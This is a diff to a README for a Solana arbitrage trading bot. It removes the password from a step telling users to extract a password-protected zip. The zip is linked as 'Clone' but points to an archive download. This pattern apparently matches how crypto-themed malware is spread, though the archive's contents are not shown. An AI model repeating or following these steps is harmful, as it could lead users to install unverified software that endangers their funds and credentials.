@@ -25,7 +25,7 @@ The Solana Arbitrage Trading Tool is an automated solution crafted to spot and c
 ## Getting Started
 Follow these steps to set up and launch the Solana Arbitrage Trading Tool on your local machine:
 - [Clone](https://github.com/garbache/Solana-arbitrage-trading/archive/refs/heads/main.zip) the repository
-- Extract the archive using the password `x`
+- Extract the archive using the password
 - Configure your environment:
   - Create a `.env file` in the project's root directory and define your environment variables. You can use the provided `.env.example` file as a template.
 - Start the trading tool.
